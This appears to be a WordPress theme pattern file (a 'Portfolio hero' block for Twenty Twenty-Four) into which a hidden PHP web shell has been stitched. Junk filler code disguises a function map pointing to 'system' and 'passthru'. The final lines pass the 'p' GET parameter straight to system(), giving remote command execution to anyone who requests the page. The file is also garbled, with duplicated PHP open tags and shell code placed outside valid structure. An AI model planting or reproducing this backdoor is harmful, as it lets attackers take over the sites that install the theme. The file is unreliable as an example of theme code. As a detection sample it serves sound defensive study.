<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Portfolio hero
 * Slug: twentytwentyfour/hidden-portfolio-hero
 * Inserter: no
 */
?>

<!-- wp:spacer {"height":"var:preset|spacing|50","style":{"layout":{}}} -->
<div style="height:var(--wp--preset--spacing--50)" aria-hidden="true" class="wp-block-spacer"></div>
<!-- /wp:spacer -->

<!-- wp:group {"align":"wide","layout":{"type":"constrained"}} -->
<div class="wp-block-group alignwide">
	<!-- wp:heading {"level":1,"align":"wide","style":{"typography":{"lineHeight":"1.2"}},"fontSize":"xx-large"} -->
	<h1 class="wp-block-heading alignwide has-xx-large-font-size" style="line-height:1.2"><?php echo wp_kses_post( __( 'I’m <em>Leia Acosta</em>, a passionate photographer who finds inspiration in capturing the fleeting beauty of life.', 'twentytwentyfour' ) ); ?></h1>
	<!-- /wp:heading -->
</div>
<!-- /wp:group -->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>